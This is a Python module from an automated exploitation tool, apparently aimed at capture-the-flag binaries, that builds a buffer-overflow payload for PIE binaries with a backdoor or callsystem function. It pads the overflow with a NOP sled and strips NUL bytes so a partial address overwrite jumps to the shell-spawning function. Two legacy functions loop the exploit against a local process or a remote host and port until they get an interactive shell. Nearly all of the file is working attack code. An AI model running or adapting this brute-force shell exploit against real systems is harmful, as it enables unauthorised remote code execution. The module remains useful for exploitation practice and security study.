"""AutoPwn primitives layer: PIE + backdoor payload builder (P6.8).

Replaces the v3.1 monolith's ``pie_backdoor_exploit`` (local) +
``pie_backdoor_exploit_remote`` (remote) payload construction
blocks (see ``autopwn/_legacy.py`` L1442-1511) with a single
typed :class:`ExploitPrimitive` subclass that emits the final
``nop_sled + cleaned_backdoor_bytes`` payload.

Per ``rebuild.md`` §6.7 P6.8 + ``refactor.md`` §3.2.2, this is
the **only primitive that depends on PIE** (Position-Independent
Executable) being enabled.  The exploitation flow in v3.1 is:

    1. P4.1 ``recon/checksec`` sets ``ctx.binary.pie = True``
    2. P4.8 (P4.7) ``recon/plt`` flags the binary as having
       ``backdoor`` (``ctx.has_backdoor = True``) or
       ``callsystem`` (``ctx.has_callsystem = True``) symbols.
    3. P5.1 ``detect/overflow`` sets ``ctx.padding`` to the
       buffer overflow offset.
    4. The strategy (P7) calls this primitive to build a
       payload of ``nop_sled * padding + b'<backdoor_bytes>'``,
       then loops brute-forcing attempts with ``process()`` /
       ``remote()`` until the program jumps to the backdoor
       (which is at the static offset ``symbol + 0x04`` to
       skip the function prologue).

Public API
----------
* :class:`PieBackdoor` — single primitive, bit-agnostic.
  * ``build_payload(ctx) -> bytes`` — emits the
    ``nop_sled + cleaned_backdoor_bytes`` payload.
  * ``stage_count()`` → 1 (single-stage; the strategy handles
    the brute-force loop separately).

Why a single class (no X32/X64 split)
---------------------------------------
v3.1 uses ``p64`` for the backdoor address regardless of the
target's bit-width.  This is **deliberate, not a bug**: the
backdoor address (e.g., ``0x9c5`` for ``Challenge/pie``) is a
4-byte value, and ``p64`` produces 4 leading NUL bytes which
the ``.replace(b'\\x00', b'')`` cleanup immediately strips.
For x32 PIE binaries the algorithm works identically because
NUL stripping collapses the p32 and p64 encodings to the same
2-byte form.  Following this precedent, P6.8 uses a single
class with p64 (not split X32/X64) — the algorithm is genuinely
bit-width-agnostic.

Why no canary variant
---------------------
The PIE backdoor path assumes a BOF (the nop sled overflows
the buffer).  When the binary has a canary, the BOF path is
intercepted by the canary bypass (P7.10) before the PIE
backdoor strategy even runs.  v3.1 main() reflects this:
the PIE backdoor branch is only entered in the
``else`` of the canary check (``_legacy.py`` L3373-3377).
P6.8 therefore needs no canary variant.

Legacy ports (parity only)
--------------------------
* :func:`_legacy_pie_backdoor_exploit` — verbatim port of
  v3.1's ``pie_backdoor_exploit`` (L1442-1475).  Has 1 caller
  (``_legacy.py`` L3376, the local no-canary PIE branch).
  Preserves the brute-force ``while True:`` loop + print_*
  output byte-for-byte.
* :func:`_legacy_pie_backdoor_exploit_remote` — verbatim port
  of v3.1's ``pie_backdoor_exploit_remote`` (L1477-1511).  Has
  1 caller (``_legacy.py`` L3373, the remote no-canary PIE
  branch).  Same brute-force loop with ``remote()`` instead
  of ``process()``.

Design notes
------------
* The NUL-stripping trick (``backdoor_bytes.replace(b'\\x00', b'')``)
  is essential — the input to the program is a C string, and
  a NUL byte would terminate it before the backdoor bytes are
  written to the buffer.  v3.1 uses this trick to make the
  payload a "clean" string with no embedded NULs.
* The ``+ 0x04`` offset to the backdoor symbol skips the
  typical x86-64 function prologue (``push rbp; mov rbp, rsp``),
  landing execution directly in the function body where the
  useful instructions (often ``system("/bin/sh")``) live.  This
  is v3.1's hand-tuned offset; P6.8 preserves it 1:1.
* The ``while True`` brute-force loop in the legacy port
  actually never breaks on success in the sense of returning
  to the caller — it calls ``io.interactive()`` and breaks,
  which terminates the program.  This is a v3.1 quirk: the
  PIE brute force is fire-and-forget; the orchestrator just
  hopes it works.  P7 will replicate this with a bounded
  attempt counter (out of P6.8 scope).
"""
from __future__ import annotations

from typing import Optional

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


# Offset added to the backdoor/callsystem symbol to skip the
# x86-64 function prologue.  v3.1 L1450 / L1452 hand-tune this
# to 0x04 (typical ``push rbp; mov rbp, rsp`` 4-byte prologue).
# P6.8 preserves 1:1 — changing this would break the backdoor
# jump target and require a different brute-force alignment.
BACKDOOR_PROLOGUE_SKIP = 0x04


def _lookup_backdoor_addr(ctx: ExploitContext) -> Optional[int]:
    """Return the runtime backdoor / callsystem address, or ``None``.

    Mirrors v3.1 L1449-1452 / L1484-1487: if ``has_callsystem`` is
    set, use the ``callsystem`` symbol; else if ``has_backdoor``
    is set, use the ``backdoor`` symbol.  ``callsystem`` wins
    when both are set (matches v3.1 — the second ``if`` overwrites
    the first).

    Both lookups add :data:`BACKDOOR_PROLOGUE_SKIP` (0x04) to
    skip the function prologue.

    Returns:
        The address (``int``) at which to jump, or ``None`` if
        neither ``has_backdoor`` nor ``has_callsystem`` is set
        (the primitive will then return ``b""``).

    Side effects:
        Read-only ELF open via pwntools.  No writes, no globals,
        no process spawns.
    """
    from pwn import ELF

    if not (ctx.has_backdoor or ctx.has_callsystem):
        return None

    try:
        e = ELF(str(ctx.binary.path), checksec=False)
    except Exception:
        return None

    try:
        if ctx.has_callsystem:
            return e.symbols["callsystem"] + BACKDOOR_PROLOGUE_SKIP
        if ctx.has_backdoor:
            return e.symbols["backdoor"] + BACKDOOR_PROLOGUE_SKIP
    except KeyError:
        return None
    return None


class PieBackdoor(ExploitPrimitive):
    """PIE + backdoor ``nop_sled + cleaned_bytes`` payload builder.

    Payload shape::

        [asm("nop") * padding] [cleaned_backdoor_bytes]

    Where:
        * ``cleaned_backdoor_bytes`` is ``p64(backdoor_addr)`` with
          embedded NUL bytes stripped (the program reads input
          as a C string; NULs would truncate the write).
        * ``backdoor_addr`` is the ``backdoor`` or ``callsystem``
          symbol + :data:`BACKDOOR_PROLOGUE_SKIP` (0x04).

    The strategy (P7) calls this primitive once, then loops:
    spawn the binary, send the payload, wait for a response,
    repeat.  PIE randomizes the load base on each execution, so
    the strategy needs to brute-force until the runtime
    ``backdoor_addr`` matches the guess (the NUL-stripped form
    of the address is the constant low bytes that don't change
    with PIE base — v3.1's whole trick).

    Requires:
        * ``ctx.binary.pie == True`` (PIE enabled).
        * ``ctx.has_backdoor == True`` OR
          ``ctx.has_callsystem == True`` (the binary has
          one of these functions; populated by P4.7/P4.8
          from the symbol table).
        * ``ctx.padding > 0`` (need a BOF offset to slide
          the nop sled into).
    """

    name = "pie-backdoor"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the PIE backdoor payload, or ``b""`` if not applicable."""
        from pwn import asm, p64

        if not ctx.binary.pie:
            return b""

        backdoor_addr = _lookup_backdoor_addr(ctx)
        if backdoor_addr is None:
            return b""

        if ctx.padding <= 0:
            return b""

        backdoor_bytes = p64(backdoor_addr)
        valid_bytes = backdoor_bytes.replace(b"\x00", b"")
        valid_byte_length = len(valid_bytes)
        cleaned_bytes = backdoor_bytes[:valid_byte_length]

        return asm("nop") * ctx.padding + cleaned_bytes


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

# ``OBSOLETE`` prefix signals: do NOT call these from new code; they
# exist only so the v3.1 monolith's callers (line numbers in
# ``_legacy.py``) can be re-routed byte-for-byte through the new
# primitive if/when P8 orchestrator retires the monolith.  The legacy
# functions retain the v3.1 ``while True`` brute-force loop and
# ``process()`` / ``remote()`` IO lifecycle, so they're not pure —
# that's intentional, they're the v3.1 "kitchen sink" version
# preserved for behavior parity.

def _legacy_pie_backdoor_exploit(  # noqa: ARG001
    program, padding, backdoor, libc_path, libc, callsystem,
):
    """[OBSOLETE — prefer :class:`PieBackdoor`] Verbatim port of v3.1's ``pie_backdoor_exploit`` (L1442-1475).

    Kept for byte-level parity with v3.1's print_* output.  New
    code should call :class:`PieBackdoor` and feed the returned
    bytes to a P7 strategy's brute-force IO loop.

    Note: ``libc_path`` and ``libc`` are accepted but unused —
    mirrors v3.1's parameter list (the PIE backdoor path is
    independent of libc; it jumps to a static binary symbol).
    """
    from pwn import asm, ELF, p64, process

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_warning, print_critical, print_debug,
    )

    print_debug(f"strategy: PIE Backdoor, padding={padding}, backdoor={backdoor:#x}")
    print_section_header("EXPLOITATION: PIE Backdoor - Local")
    print_payload("preparing PIE backdoor brute force")

    elf = ELF(program)
    if backdoor == 1:
        backdoor = elf.symbols["backdoor"] + 0x04
    if callsystem == 1:
        backdoor = elf.symbols["callsystem"] + 0x04
    backdoor_bytes = p64(backdoor)
    valid_bytes = backdoor_bytes.replace(b"\x00", b"")
    valid_byte_length = len(valid_bytes)

    cleaned_bytes = backdoor_bytes[:valid_byte_length]
    payload = asm("nop") * padding + cleaned_bytes

    count = 1
    print_info("starting PIE brute force attack")
    while True:
        io = process(program)
        try:
            count += 1
            print_info(
                f"attempt {Colors.YELLOW}{count}{Colors.END}",
                prefix="[BRUTE]",
            )
            io.recv()
            io.send(payload)
            recv = io.recv(timeout=10)
        except Exception:
            print_warning(f"attempt {count} failed", prefix="[BRUTE]")
        else:
            print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
            io.interactive()
            break


def _legacy_pie_backdoor_exploit_remote(  # noqa: ARG001
    program, padding, backdoor, libc_path, libc, url, port, callsystem,
):
    """[OBSOLETE — prefer :class:`PieBackdoor`] Verbatim port of v3.1's ``pie_backdoor_exploit_remote`` (L1477-1511).

    Same as :func:`_legacy_pie_backdoor_exploit` but with
    ``remote()`` IO instead of ``process()`` and the URL:port
    printed in the brute-force banner.

    Note: ``libc_path`` and ``libc`` are accepted but unused,
    same as the local variant.
    """
    from pwn import asm, ELF, p64, remote

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_warning, print_critical, print_debug,
    )

    print_debug(f"strategy: PIE Backdoor (remote), padding={padding}")
    print_section_header("EXPLOITATION: PIE Backdoor - Remote")
    print_payload("preparing PIE backdoor brute force")

    elf = ELF(program)
    if backdoor == 1:
        backdoor = elf.symbols["backdoor"] + 0x04
    if callsystem == 1:
        backdoor = elf.symbols["callsystem"] + 0x04

    backdoor_bytes = p64(backdoor)
    valid_bytes = backdoor_bytes.replace(b"\x00", b"")
    valid_byte_length = len(valid_bytes)

    cleaned_bytes = backdoor_bytes[:valid_byte_length]
    payload = asm("nop") * padding + cleaned_bytes

    count = 1
    print_info(
        f"starting PIE brute force attack against "
        f"{Colors.YELLOW}{url}:{port}{Colors.END}"
    )
    while True:
        io = remote(url, port)
        try:
            count += 1
            print_info(
                f"attempt {Colors.YELLOW}{count}{Colors.END}",
                prefix="[BRUTE]",
            )
            io.recv()
            io.send(payload)
            recv = io.recv(timeout=10)
        except Exception:
            print_warning(f"attempt {count} failed", prefix="[BRUTE]")
        else:
            print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
            io.interactive()
            break


__all__ = [
    "PieBackdoor",
    "BACKDOOR_PROLOGUE_SKIP",
    "_lookup_backdoor_addr",
    "_legacy_pie_backdoor_exploit",
    "_legacy_pie_backdoor_exploit_remote",
]
